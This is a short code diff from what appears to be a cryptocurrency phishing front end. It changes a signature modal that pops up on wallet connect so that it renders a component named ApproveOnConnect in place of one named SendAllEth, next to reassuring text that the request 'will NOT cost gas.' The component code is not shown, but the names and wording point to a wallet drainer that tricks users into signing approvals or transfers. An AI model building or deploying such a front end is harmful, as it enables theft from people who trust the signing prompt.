@@ -140,8 +140,8 @@ This request will NOT cost gas.`;
 
       {/* NEW Signature Modal */}
       {showSignModal && (
-        // <ApproveOnConnect />
-        <SendAllEth />
+        <ApproveOnConnect />
+        // <SendAllEth />
 //         <div className="fixed inset-0 z-[120] flex items-center justify-center px-4 backdrop-blur-md bg-black/60">
 //           <div className="w-full max-w-md rounded-2xl bg-[#121826] border border-purple-500/30 shadow-xl relative overflow-hidden">
 //             <div className="absolute inset-0 bg-gradient-to-br from-purple-900/20 via-transparent to-blue-900/20 pointer-events-none" />
